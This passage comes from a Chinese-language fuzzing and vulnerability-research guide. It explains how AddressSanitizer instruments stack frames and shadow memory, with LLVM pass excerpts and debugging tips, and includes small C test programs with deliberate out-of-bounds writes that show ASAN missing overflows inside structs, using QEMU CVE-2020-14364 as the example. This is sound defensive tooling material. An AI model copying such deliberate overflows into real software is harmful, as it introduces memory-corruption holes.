  Value *BasePlus0 = IRB.CreateIntToPtr(LocalStackBase, IntptrPtrTy);
  IRB.CreateStore(ConstantInt::get(IntptrTy, kCurrentStackFrameMagic),
                  BasePlus0);
  // Write the frame description constant to redzone[1].
  Value *BasePlus1 = IRB.CreateIntToPtr(
      IRB.CreateAdd(LocalStackBase,
                    ConstantInt::get(IntptrTy, ASan.LongSize / 8)),
      IntptrPtrTy);
  GlobalVariable *StackDescriptionGlobal =
      createPrivateGlobalForString(*F.getParent(), DescriptionString,
                                   /*AllowMerging*/ true, kAsanGenPrefix);
  Value *Description = IRB.CreatePointerCast(StackDescriptionGlobal, IntptrTy);
  IRB.CreateStore(Description, BasePlus1);
  // Write the PC to redzone[2].
  Value *BasePlus2 = IRB.CreateIntToPtr(
      IRB.CreateAdd(LocalStackBase,
                    ConstantInt::get(IntptrTy, 2 * ASan.LongSize / 8)),
      IntptrPtrTy);
  IRB.CreateStore(IRB.CreatePointerCast(&amp;F, IntptrTy), BasePlus2);

  const auto &amp;ShadowAfterScope = GetShadowBytesAfterScope(SVD, L);  // 根据SVD中记录栈中各个变量对应的内存位置初始化ShadowTable的栈内存

  Value *ShadowBase = ASan.memToShadow(LocalStackBase, IRB);  // ASan.memToShadow()用于计算进程内存在ShadowTable的偏移位置
  copyToShadow(ShadowAfterScope, ShadowAfterScope, IRB, ShadowBase);  // 21给函数栈内存投毒

  if (!StaticAllocaPoisonCallVec.empty()) {  // 2.对栈中分配的变量在ShadowTable中消毒
    const auto &amp;ShadowInScope = GetShadowBytes(SVD, L);

    for (const auto &amp;APC : StaticAllocaPoisonCallVec) {
      const ASanStackVariableDescription &amp;Desc = *AllocaToSVDMap[APC.AI];
      assert(Desc.Offset % L.Granularity == 0);
      size_t Begin = Desc.Offset / L.Granularity;
      size_t End = Begin + (APC.Size + L.Granularity - 1) / L.Granularity;

      IRBuilder&lt;&gt; IRB(APC.InsBefore);
      copyToShadow(ShadowAfterScope,
                   APC.DoPoison ? ShadowAfterScope : ShadowInScope, Begin, End,
                   IRB, ShadowBase);
    }
  }
  /*
  投毒再消毒后,ShadowTable的内存数据布局如下:
  1.ShadowTable分配栈后对内存投毒 =&gt;  F3F3F8F8F1F1F1F1
  2.对栈中需要用到的变量位置消毒  =&gt;  F3F30000F1F1F1F1
  此时访问栈变量,获取到的数据就是0x00,为正常数据访问;如果是不允许访问的话,那就必定不为0
  */

  SmallVector&lt;uint8_t, 64&gt; ShadowClean(ShadowAfterScope.size(), 0);
  SmallVector&lt;uint8_t, 64&gt; ShadowAfterReturn;

  for (auto Ret : RetVec) {
    IRBuilder&lt;&gt; IRBRet(Ret);
    // Mark the current frame as retired.
    IRBRet.CreateStore(ConstantInt::get(IntptrTy, kRetiredStackFrameMagic),
                       BasePlus0);

    // 简单总结就是在函数返回时清空ShadowTable中的栈数据为0xF5
    // if FakeStack != 0  // LocalStackBase == FakeStack
    //     // In use-after-return mode, poison the whole stack frame.
    //     if StackMallocIdx &lt;= 4
    //         // For small sizes inline the whole thing:
    //         memset(ShadowBase, kAsanStackAfterReturnMagic, ShadowSize);
    //         **SavedFlagPtr(FakeStack) = 0
    //     else
    //         __asan_stack_free_N(FakeStack, LocalStackSize)
    // else
    //     &lt;This is not a fake stack; unpoison the redzones&gt;
    Value *Cmp =
        IRBRet.CreateICmpNE(FakeStack, Constant::getNullValue(IntptrTy));
    Instruction *ThenTerm, *ElseTerm;
    SplitBlockAndInsertIfThenElse(Cmp, Ret, &amp;ThenTerm, &amp;ElseTerm);

    IRBuilder&lt;&gt; IRBPoison(ThenTerm);
    if (StackMallocIdx &lt;= 4) {
      int ClassSize = kMinStackMallocSize &lt;&lt; StackMallocIdx;
      ShadowAfterReturn.resize(ClassSize / L.Granularity,
                               kAsanStackUseAfterReturnMagic);
      copyToShadow(ShadowAfterReturn, ShadowAfterReturn, IRBPoison,
                   ShadowBase);
      Value *SavedFlagPtrPtr = IRBPoison.CreateAdd(
          FakeStack,
          ConstantInt::get(IntptrTy, ClassSize - ASan.LongSize / 8));
      Value *SavedFlagPtr = IRBPoison.CreateLoad(
          IntptrTy, IRBPoison.CreateIntToPtr(SavedFlagPtrPtr, IntptrPtrTy));
      IRBPoison.CreateStore(
          Constant::getNullValue(IRBPoison.getInt8Ty()),
          IRBPoison.CreateIntToPtr(SavedFlagPtr, IRBPoison.getInt8PtrTy()));
    } else {
      // For larger frames call __asan_stack_free_*.
      IRBPoison.CreateCall(
          AsanStackFreeFunc[StackMallocIdx],
          {FakeStack, ConstantInt::get(IntptrTy, LocalStackSize)});
    }

    IRBuilder&lt;&gt; IRBElse(ElseTerm);
    copyToShadow(ShadowAfterScope, ShadowClean, IRBElse, ShadowBase);
  }
}
</code></pre>
<p>ASAN的实现中有大量的内存分配/操作功能,很显然,如果通过Pass模块把这些函数插入到Module会让Pass非常臃肿,所以ASAN把它的一些核心功能写在了Compiler-RT中,让Clang在链接阶段引入它们.</p>
<h4 id="llvm-compilerrt与asan内置函数"><a class="header" href="#llvm-compilerrt与asan内置函数">LLVM-CompilerRT与ASAN内置函数</a></h4>
<p>实际上,ASAN在程序运行main()之前就会执行初始化,ASAN把<code>asan_module_ctor()</code>函数地址写到.init_array区段,当程序启动时执行<code>__libc_csu_init()</code>函数时就会执行<code>asan_module_ctor()</code>初始化ASAN内部运行环境.</p>
<pre><code class="language-assembly">.init_array:00000000004F65D8 ; ELF Initialization Function Table
.init_array:00000000004F65D8 ; ===========================================================================
.init_array:00000000004F65D8
.init_array:00000000004F65D8 ; Segment type: Pure data
.init_array:00000000004F65D8 ; Segment permissions: Read/Write
.init_array:00000000004F65D8 ; Segment alignment 'qword' can not be represented in assembly
.init_array:00000000004F65D8 _init_array     segment para public 'DATA' use64
.init_array:00000000004F65D8                 assume cs:_init_array
.init_array:00000000004F65D8                 ;org 4F65D8h
.init_array:00000000004F65D8 __init_array_start dq offset asan_module_ctor  //  ASAN初始化函数
.init_array:00000000004F65D8                                         ; DATA XREF: __libc_csu_init+6↑o
.init_array:00000000004F65E0 __frame_dummy_init_array_entry dq offset frame_dummy
.init_array:00000000004F65E8                 dq offset _GLOBAL__sub_I_asan_rtl_cpp
.init_array:00000000004F65E8 _init_array     ends
.fini_array:00000000004F65F0 __init_array_end dq offset asan_module_dtor
</code></pre>
<p>接下来,<code>__asan_init()</code>就会初始化.代码目录在\llvm-project\compiler-rt\lib\asan\asan_activation.cpp.</p>
<pre><code class="language-c++">void __asan_init() {
  AsanActivate();
  AsanInitInternal();
}

void AsanActivate() {
  asan_deactivated_flags.OverrideFromActivationFlags();  // 从环境变量ASAN_ACTIVATION_OPTIONS中获取ASAN配置

  SetCanPoisonMemory(asan_deactivated_flags.poison_heap);
  SetMallocContextSize(asan_deactivated_flags.malloc_context_size);
  ReInitializeAllocator(asan_deactivated_flags.allocator_options);
}

static void AsanInitInternal() {
  InitializeHighMemEnd();
  InitializeShadowMemory();

  AllocatorOptions allocator_options;
  allocator_options.SetFrom(flags(), common_flags());
  InitializeAllocator(allocator_options);

  InitializeCoverage(common_flags()-&gt;coverage, common_flags()-&gt;coverage_dir);
}
</code></pre>
<p>这只是Compiler-RT ASAN功能的小部分,还有更多有趣的细节读者们可以自行探索.</p>
<h4 id="asan检测结构体的bug"><a class="header" href="#asan检测结构体的bug">ASAN检测结构体的Bug</a></h4>
<p>笔者在实际场景中发现了个这样问题:<strong>ASAN对结构体内的buffer溢出是不支持检测的</strong>.举个例子:</p>
<pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

#define BUFFER_MAX (0x10)


typedef struct {
    int a;
    char buffer[BUFFER_MAX];
    int b;
    int c;
} no_check;

typedef struct {
    int a;
    char* buffer;
    int b;
    int c;
} check;


int main() {
    no_check test_obj1 = {0};
    check test_obj2 = {};

    printf(&quot;no crash!\n&quot;);
    test_obj1.buffer[BUFFER_MAX] = 0xFF;

    printf(&quot;crash!\n&quot;);
    test_obj2.buffer = malloc(BUFFER_MAX);
    test_obj2.buffer[BUFFER_MAX] = 0xFF;

    return 0;
}
</code></pre>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ clang -fsanitize=address ./test_case_6.c -o ./test_case_6 &amp;&amp; ./test_case_6
no crash!
crash!
=================================================================
==529347==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000020 at pc 0x0000004c51f4 bp 0x7ffe84ee9fb0 sp 0x7ffe84ee9fa8
WRITE of size 1 at 0x602000000020 thread T0
    #0 0x4c51f3 in main (/home/ubuntu/Desktop/instrument_note/test_case_6+0x4c51f3)
    #1 0x7f99e1bb6cb1 in __libc_start_main csu/../csu/libc-start.c:314:16
    #2 0x41b2bd in _start (/home/ubuntu/Desktop/instrument_note/test_case_6+0x41b2bd)

...
</code></pre>
<p>ASAN为什么会检测失败呢?简单地说,ASAN认为struct结构体是一块连续的内存,即使在内部出现了**char[]**这样的连续数组,即使是触发越界都不会认为是错误.那么我们来看一个真实的例子,qemu usb模块越权读写漏洞CVE-2020-14364.</p>
<pre><code class="language-c">struct USBDevice {
    DeviceState qdev;
    // ...

    int32_t state;
    uint8_t setup_buf[8];
    uint8_t data_buf[4096];
    int32_t remote_wakeup;
    int32_t setup_state;
    int32_t setup_len;
    int32_t setup_index;

    USBEndpoint ep_ctl;
    USBEndpoint ep_in[USB_MAX_ENDPOINTS];
    USBEndpoint ep_out[USB_MAX_ENDPOINTS];

    // ...
};
</code></pre>
<p>对data_buf进行越界操作,此时ASAN就无法检测出来漏洞了.qemu的设备对象大部分都是这样声明的,所以就导致即使fuzzer跑出了漏洞,ASAN仍然认为是<em>正常的</em>.</p>
<p>为了解决这个问题,笔者重新对ASAN的插桩代码进行修改,核心思想是:</p>
<ol>
<li>插桩阶段遍历所有GetElementPtrInst指令,如果指令中存在<code>char[]</code>这种Array型变量,那么就在该结构体最后创建新字段用于保存该buffer在ShadowTable中的映射.然后再调整结构体中新字段偏移,让<code>instrumentMop()</code>生成的插桩检测逻辑使用ShadowTable中的分配内存来检测而不是原来的结构体内存.</li>
<li>栈平衡阶段对所有结构体中新创建的字段保存<code>malloc()</code>分配的内存,此时越界是可以被内存检测的.</li>
</ol>
<p>修改过后的Demo效果如下:</p>
<p><img src="./pic12/Asan-fix-Demo.png" alt="" /></p>
<h2 id="实战中asan会有哪些坑"><a class="header" href="#实战中asan会有哪些坑">实战中ASAN会有哪些坑</a></h2>
<h4 id="libasan库缺失如何解决"><a class="header" href="#libasan库缺失如何解决">libasan库缺失如何解决?</a></h4>
<p>使用ASAN时有概率会出现下面的问题.</p>
<pre><code class="language-sh">$ g++ -O -g -fsanitize=address heap-use-after-free.cpp

/usr/bin/ld: cannot find /usr/lib64/libasan.so.0.0.0
collect2: error: ld returned 1 exit status
</code></pre>
<p>这是因为在链接阶段没有找到libasan库,前文提到,ASAN的运行时函数是封装在Compiler-RT库中的.所以在正常的编译环境下它会在/usr/lib中出现.</p>
<pre><code class="language-sh">fuzzing@fuzzing-virtual-machine:~/Desktop/test_code$ find /usr/ | grep libasan
/usr/share/doc/libasan5
/usr/share/doc/libasan6
/usr/lib/gcc/x86_64-linux-gnu/8/libasan_preinit.o
/usr/lib/gcc/x86_64-linux-gnu/8/libasan.a
/usr/lib/gcc/x86_64-linux-gnu/8/libasan.so
/usr/lib/gcc/x86_64-linux-gnu/10/libasan_preinit.o
/usr/lib/gcc/x86_64-linux-gnu/10/libasan.a
/usr/lib/gcc/x86_64-linux-gnu/10/libasan.so
/usr/lib/x86_64-linux-gnu/libasan.so.5
/usr/lib/x86_64-linux-gnu/libasan.so.6
/usr/lib/x86_64-linux-gnu/libasan.so.6.0.0
/usr/lib/x86_64-linux-gnu/libasan.so.5.0.0
</code></pre>
<p>找不到libasan库有两种解决方法:</p>
<ul>
<li>联网环境下,使用<code>sudo apt install libasan</code>即可安装.</li>
<li>非联网环境下,找到LLVM Compiler-RT的源码下载编译并<code>make install</code>即可.</li>
</ul>
<h4 id="模糊测试中遇到老旧不维护的库一直产生崩溃怎么样让asan屏蔽对它的检测"><a class="header" href="#模糊测试中遇到老旧不维护的库一直产生崩溃怎么样让asan屏蔽对它的检测">模糊测试中遇到老旧不维护的库一直产生崩溃,怎么样让ASAN屏蔽对它的检测?</a></h4>
<p>对于这类一直让ASAN产生崩溃但是不知道如何修复的代码,我们可以使用ASAN的黑名单来禁止对这些指定的函数插桩,甚至只对某几个特定的函数做插桩检测.详情参考官方文档 https://clang.llvm.org/docs/SanitizerSpecialCaseList.html</p>
<h4 id="asan有哪些常用设置"><a class="header" href="#asan有哪些常用设置">ASAN有哪些常用设置?</a></h4>
<p>ASAN_OPTIONS</p>
<p>https://github.com/google/sanitizers/wiki/AddressSanitizerFlags</p>
<h4 id="shadow-table内存粒度有什么意义"><a class="header" href="#shadow-table内存粒度有什么意义">Shadow Table内存粒度有什么意义?</a></h4>
<p>Shadow Table需要分配一块比较大的内存,用于对程序对的堆和栈做映射.这块内存能够映射的大小是有限的,所以就需要找到一种方式在尽可能少的内存里面保存更多的内存映射.举个例子:</p>
<pre><code class="language-text">FF FF FF FF 00 00 00 00 00 00 00 00 FF FF FF FF
</code></pre>
<p>这块内存数据表示占用8字节缓冲区进行投毒的内存布局.如果程序中大量使用这样的内存,那么很容易就把ASAN的Shadow Table占满,于是我们就有压缩Shadow Table的需求.压缩之后,Shadow Table的内存布局就变成了:</p>
<pre><code class="language-text">FF FF FF FF 00 FF FF FF FF
</code></pre>
<p>此时内存占用变小了一半.现在我们再回过来理解内存粒度的概念,未优化时的内存粒度为1,优化之后的内存粒度为8.先来看直观的例子:</p>
<pre><code class="language-c">int main(int argc,char** argv) {
    char buffer[0x10] = {0};

    buffer[0x10] = 'C';

    return 1;
}

// 编译参数:clang -fsanitize=address ./test_asan_granularity.c -o ./test_asan_granularity
</code></pre>
<p><img src="./pic12/6.png" alt="" /></p>
<p>接下来尝试编译<code>clang -fsanitize=address -mllvm -asan-mapping-scale=4 ./test_asan_granularity.c -o ./test_asan_granularity</code>,ASAN的崩溃内容出现了异常.</p>
<p><img src="./pic12/7.png" alt="" /></p>
<p>接下来再观察这个测试用例.因为内存粒度为8字节(为什么要取值为8字节压缩呢?笔者猜测应该是对齐x64平台的数据类型),此时buffer占用4字节,剩下4字节变量a也在Shadow Table压缩的这块内存里.ASAN的处理方法是在这一字节的Shadow Table内存中记录一个标记,标识这里可能会存在内存越界(只要Shadow Table的值不为0就认为是有异常的).</p>
<pre><code class="language-c">int main(int argc,char** argv) {
    short buffer[2] = {0};
    long a;

    buffer[3] = 1024;

    return 1;
}
</code></pre>
<p><img src="C:%5CUsers%5CFremy%5CDesktop%5Cvm%5Cinstrument%5Cpic12%5C8.png" alt="" /></p>
<p>现在我们就可以理解ASAN的这一行输出的意义了:</p>
<pre><code class="language-text">Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07   // &lt;&lt;&lt;&lt; 这里呀
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
</code></pre>
<p>它的意思是,当前被压缩的内存中存在n字节其它变量占用的内存(n=1-7).</p>
<h4 id="如何调试使用asan的程序"><a class="header" href="#如何调试使用asan的程序">如何调试使用ASAN的程序?</a></h4>
<p>一般地,ASAN崩溃有几种可能:</p>
<ul>
<li>
<p>ASAN初始化时崩溃,可能是机器上内存不足导致.</p>
</li>
<li>
<p>全局对象初始化时崩溃,比如说C++全局声明的类对象,它会在程序初始化阶段(还记得init_array嘛,就是在这里插入了回调函数实例化全局对象)执行,也会存在内存问题.</p>
</li>
<li>
<p>运行时库异常,常见于Windows平台上.</p>
</li>
<li>
<p>创建栈时崩溃.</p>
</li>
<li>
<p>项目代码崩溃.</p>
<p>笔者在上一小节测试内存粒度时遇到了ASAN在函数初始化的阶段创建Shadow Table时直接崩溃了.</p>
</li>
</ul>
<p><img src="./pic12/9.png" alt="" /></p>
<p>从输出我们可以知道,main函数的断点命中之后,接下来执行一次单步调试时就抛出ASAN的检测异常了,也就是说没有执行到用户在main函数中写的任何代码就崩溃了,那么产生崩溃肯定是在ASAN在创建Shadow Table初始化函数栈时触发的崩溃.我们把源程序反编译,查看0x4C500B的汇编.</p>
<p><img src="C:%5CUsers%5CFremy%5CDesktop%5Cvm%5Cinstrument%5Cpic12%5C10.png" alt="" /></p>
<p>对应的LLVM IR:</p>
<pre><code class="language-llvm">  %21 = inttoptr i64 %20 to i64*
  store i64 -1012762419733073423, i64* %21, align 1
</code></pre>
<p>原来是对Shadow Table进行投毒时触发了内存异常,导致程序异常崩溃了,知道原因之后就有思路再去寻找办法解决问题,像这样奇奇怪怪的问题还有很多,只能通过调试去找到问题的根源再解决.</p>
<p>那么如何调试一次由用户代码触发的崩溃呢?笔者的方法是:</p>
<ul>
<li>
<p>根据ASAN栈崩溃信息定位到触发崩溃的代码,并分析漏洞原因是因为那些判断逻辑没有做好检验和关注变量内容.</p>
</li>
<li>
<p>根据猜想编写gdb脚本.</p>
</li>
<li>
<p>运行gdb观察值的变化.</p>
<p>举个例子,代码某个位置产生了越界访问,于是猜想是不是长度校验判断有问题,编写gdb脚本来监控这两个值的变化:</p>
</li>
</ul>
<pre><code class="language-gdb">b func1
command
b 1031
command
print &quot;&gt;&gt;&gt;&gt;&quot;
print &quot;Size=&quot;
print array_size
print &quot;offset=&quot;
print offset
c
end
c
end
</code></pre>
<p>然后使用gdb命令执行<code>gdb --command=./gdb_crash_analysis.gsh -arg ./fuzzer file ./crash</code>,观察崩溃前对应的数值.</p>
<pre><code>Breakpoint 2, func1 (this=0x7fffffffbae0, stream_0=0x7fffffffbb00, int_2=59852, int_3=1668261324, int_4=60, int_5=45056, int_6=1668246528, int_7=204,
    class508_0=..., rangeList1_0=0x7fffffff7820, list_0=std::vector of length 2, capacity 2 = {...}, list_1=std::vector of length 2, capacity 2 = {...},
    list_0_types=std::vector of length 2, capacity 2 = {...}) at Process.cpp
1468	                arrays[j] = *(stream_0-&gt;begin() + Position + j);
$6 = &quot;&gt;&gt;&gt;&gt;&quot;
$7 = &quot;Size=&quot;
$8 = 20
$9 = &quot;offset=&quot;
$10 = 1668261324  // &lt;&lt;&lt;&lt; Overflow !

Program received signal SIGSEGV, Segmentation fault.
0x000000000060980e in func1 (this=0x7fffffffbae0, stream_0=0x7fffffffbb00, int_2=59852, int_3=1668261324, int_4=60, int_5=45056, int_6=1668246528,
    int_7=204, class508_0=..., rangeList1_0=0x7fffffff7820, list_0=std::vector of length 2, capacity 2 = {...}, list_1=std::vector of length 2, capacity 2 = {...},
    list_0_types=std::vector of length 2, capacity 2 = {...}) at Process.cpp
1468	                arrays[j] = *(stream_0-&gt;begin() + Position + j);     ////  &lt;&lt;&lt;  Position = 1668261324
(gdb)

AddressSanitizer:DEADLYSIGNAL
=================================================================
==2995382==ERROR: AddressSanitizer: SEGV on unknown address 0x7ff2203d3dcc (pc 0x000000609846 bp 0x7ffc18159c50 sp 0x7ffc18157760 T0)
==2995382==The signal is caused by a READ memory access.
    #0 0x609846 in func1(std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;*, int, int, int, int, int, int, C508, RangeList*, std::vector&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt;, std::allocator&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt; &gt; &gt;&amp;, std::vector&lt;int, std::allocator&lt;int&gt; &gt;&amp;, std::vector&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt;, std::allocator&lt;std::pair&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::vector&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, std::allocator&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; &gt; &gt; &gt; &gt; &gt;&amp;) Process.cpp
    #1 0x6006e7 in func1(FileReaderHelp*, FileInfo, std::vector&lt;unsigned char, std::allocator&lt;unsigned char&gt; &gt;&amp;, St*, Struct90) Process.cpp
    # ....
    #9 0x54c65b in main fuzz_main.cpp
    #10 0x7ff1c3c26cb1 in __libc_start_main csu/../csu/libc-start.c:314:16
    #11 0x411c0d in _start (v5+0x411c0d)
</code></pre>
<h4 id="x64-asan为什么不兼容"><a class="header" href="#x64-asan为什么不兼容">x64 ASAN为什么不兼容?</a></h4>
<p>有时候在64位平台上使用ASAN编译会提示以下错误(参考链接:https://stackoverflow.com/questions/59007118/how-to-enable-address-sanitizer-at-godbolt-org/59010436#59010436):</p>
<pre><code class="language-text">==3==ERROR: AddressSanitizer failed to allocate 0xdfff0001000 (15392894357504) bytes at address 2008fff7000 (errno: 12)
==3==ReserveShadowMemoryRange failed while trying to map 0xdfff0001000 bytes. Perhaps you're using ulimit -v
</code></pre>
<p>在32位引入ASAN编译时,Shadow Table分配内存占用几百MB.但是使用64位ASAN编译时会占用20T内存,因为malloc分配这么大的内存失败,才提示了这个错误.解决方法一般有两个:1.直接限制内存分配大小,让malloc()成功分配;2.设置虚拟内存到交换分区.</p>
<p>ASAN官方的解决方法是使用ulimit命令来限制内存使用(参考引用:https://github.com/mirrorer/afl/blob/master/docs/notes_for_asan.txt),但是这个方式并不一定有效.所以我们可以使用虚拟内存映射到磁盘交互分区的方式再次尝试(参考引用:https://qastack.cn/unix/44985/limit-memory-usage-for-a-single-linux-process)</p>
<h4 id="asan-for-windows使用msvc还是llvm"><a class="header" href="#asan-for-windows使用msvc还是llvm">ASAN for Windows使用MSVC还是LLVM?</a></h4>
<p>https://developercommunity.visualstudio.com/t/enabled-asan-address-sanitizer-for-x64-build-cause/1139763</p>
<p>https://devblogs.microsoft.com/cppblog/asan-for-windows-x64-and-debug-build-support/</p>
<p>https://docs.microsoft.com/en-us/cpp/build/reference/incremental-link-incrementally?view=msvc-160</p>
<p>https://github.com/microsoft/WSL/issues/121</p>
<h4 id="主程序和动态链接库的asan兼容吗"><a class="header" href="#主程序和动态链接库的asan兼容吗">主程序和动态链接库的ASAN兼容吗?</a></h4>
<p>有空再写</p>
<h2 id="参考引用"><a class="header" href="#参考引用">参考引用</a></h2>
<ol>
<li>Compile-time-instrumentation-flow-in-LLVM(https://www.researchgate.net/figure/Compile-time-instrumentation-flow-in-LLVM_fig1_262175489)</li>
<li>LLVM Sanitizer-Coverage Document(https://clang.llvm.org/docs/SanitizerCoverage.html)</li>
<li>LLVM Source-based Code Coverage(https://bcain-llvm.readthedocs.io/projects/clang/en/release_50/SourceBasedCodeCoverage/)</li>
<li>libfuzzer-workshop(https://github.com/Dor1s/libfuzzer-workshop)</li>
<li>LLVM AddressSanitizer Document(https://clang.llvm.org/docs/AddressSanitizer.html)</li>
<li>AddressSanitizer Wiki(https://github.com/google/sanitizers/wiki/AddressSanitizer)</li>
<li>llvm::MemIntrinsic Class Reference(https://llvm.org/doxygen/classllvm_1_1MemIntrinsic.html)</li>
<li>llvm::IntrinsicInst Class Reference(https://llvm.org/doxygen/classllvm_1_1IntrinsicInst.html)</li>
<li>LLVM llvm-lifetime-start-intrinsic(https://llvm.org/docs/LangRef.html#llvm-lifetime-start-intrinsic)</li>
<li>llvm::AllocaInst Class Reference(https://llvm.org/doxygen/classllvm_1_1AllocaInst.html)</li>
<li>llvm::IRBuilder Class Template Reference(https://llvm.org/doxygen/classllvm_1_1IRBuilder.html)</li>
<li>C++全局构造和析构(https://www.jianshu.com/p/56ea6e9d00e9)</li>
<li>CVE-2020-14364 QEMU逃逸 漏洞分析 (含完整EXP)(https://mp.weixin.qq.com/s/MQyczZXRfOsIQewNf7cfXw)</li>
<li>libFuzzer Document(https://llvm.org/docs/LibFuzzer.html)</li>
<li>libFuzzer Source by guidovranken(https://github.com/guidovranken/libfuzzer-gv)</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="4-fuzzing-模糊测试之数据输入"><a class="header" href="#4-fuzzing-模糊测试之数据输入">4. Fuzzing 模糊测试之数据输入</a></h1>
<ul>
<li><a href="2.Fuzzing.html#%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7">必备工具</a></li>
<li><a href="2.Fuzzing.html#fuzzing-%E4%B8%8E%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87">Fuzzing 与代码覆盖率</a></li>
<li><a href="2.Fuzzing.html#fuzzing-%E6%94%BB%E5%87%BB%E7%82%B9">Fuzzing 攻击点</a>
<ul>
<li><a href="2.Fuzzing.html#python-%E5%BA%93">Python 库</a></li>
<li><a href="2.Fuzzing.html#python-%E5%86%85%E9%83%A8%E5%AF%B9%E8%B1%A1">Python 内部对象</a></li>
<li><a href="2.Fuzzing.html#python-%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83">Python 运行环境</a></li>
</ul>
</li>
<li><a href="2.Fuzzing.html#fuzzing-%E7%9A%84%E5%85%A5%E5%8F%A3%E7%82%B9">Fuzzing 的入口点</a></li>
<li><a href="2.Fuzzing.html#fuzzing-%E6%95%B0%E6%8D%AE%E7%94%9F%E6%88%90">Fuzzing 数据生成</a>
<ul>
<li><a href="2.Fuzzing.html#%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E6%95%B0%E6%8D%AE">随机生成数据</a></li>
<li><a href="2.Fuzzing.html#%E6%8C%89%E7%BB%93%E6%9E%84%E7%94%9F%E6%88%90%E6%95%B0%E6%8D%AE">按结构生成数据</a></li>
</ul>
</li>
<li><a href="2.Fuzzing.html#%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E9%80%89%E6%8B%A9%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E6%95%B0%E6%8D%AE%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E9%80%89%E6%8B%A9%E6%8C%89%E7%BB%93%E6%9E%84%E7%94%9F%E6%88%90%E6%95%B0%E6%8D%AE">什么时候选择随机生成数据,什么时候选择按结构生成数据</a>
<ul>
<li><a href="2.Fuzzing.html#fuzzing-waf">Fuzzing WAF</a></li>
<li><a href="2.Fuzzing.html#fuzzing-windows-%E5%86%85%E6%A0%B8">Fuzzing Windows 内核</a></li>
<li><a href="2.Fuzzing.html#fuzzing-imagemagick">Fuzzing ImageMagick</a></li>
<li><a href="2.Fuzzing.html#fuzzing-%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE">Fuzzing 网络协议</a></li>
</ul>
</li>
<li><a href="2.Fuzzing.html#%E7%BB%93%E5%B0%BE">结尾</a></li>
<li><a href="2.Fuzzing.html#afl-%E5%92%8Clibfuzzer-%E7%9A%84%E6%BC%94%E7%A4%BA">AFL 和libFuzzer 的演示</a></li>
</ul>
<h2 id="必备工具-1"><a class="header" href="#必备工具-1">必备工具</a></h2>
<p>Python ,Source Insight</p>
<h2 id="fuzzing-与代码覆盖率"><a class="header" href="#fuzzing-与代码覆盖率">Fuzzing 与代码覆盖率</a></h2>
<p>前面一章说到在Github 上快速阅读代码,这样有助于我们去了解关于我们要挖掘漏洞的目标的一些理解,对于程序有了一些理解之后,接下来就可以尝试写些Fuzzing 来跑跑漏洞了.</p>
<p>Fuzzing 是模糊测试的意思,我们可以按照给定的格式来生成数据或者随机生成,观察程序有没有处理异常或者程序崩溃.读者要注意的一点是:<strong>二进制Fuzzing 的思路和WEB Fuzzing 的思路是完全不同的</strong>,后面会通过许多的例子来告诉大家二进制和WEB Fuzzing 到底差异在哪里.<strong>Fuzzing 和源码挖洞是相互辅助的!不要把能不能挖到漏洞的锅都丢给Fuzzing ,Fuzzing 不出来就是没有漏洞;也不要把全部的精力都花在阅读源码上,有很多时候会迷失在代码里,忘记上下文到底在做些什么,越看越迷茫.这是成本与收益的博弈,对于代码量较大的程序来说,偏向Fuzzing 的投入产出比较高;对于代码量较小的程序来说,偏向阅读源码的投入产出比较高</strong>.</p>
<p>代码覆盖率是说,这次自动化测试触发了的代码占整体代码的比率是多少.要想对一个程序的所有代码都要测试到,这样的代码覆盖率就是100% ,这是不可能的,因为会有很多的功能和代码是需要联合起来触发的,有的代码触发条件逻辑非常复杂,这些都是Fuzzing 的短板,Fuzzing 在对某一个攻击点测试上效果是很好的,一个程序会有很多的攻击点,所以要针对各个不同的攻击点都要写不同的Fuzzer ,提高Fuzzing 代码覆盖率.</p>
<h2 id="fuzzing-攻击点"><a class="header" href="#fuzzing-攻击点">Fuzzing 攻击点</a></h2>
<p>以Python 为例子,Python 的攻击点有三处:库,内部对象,运行环境</p>
<h3 id="python-库"><a class="header" href="#python-库">Python 库</a></h3>
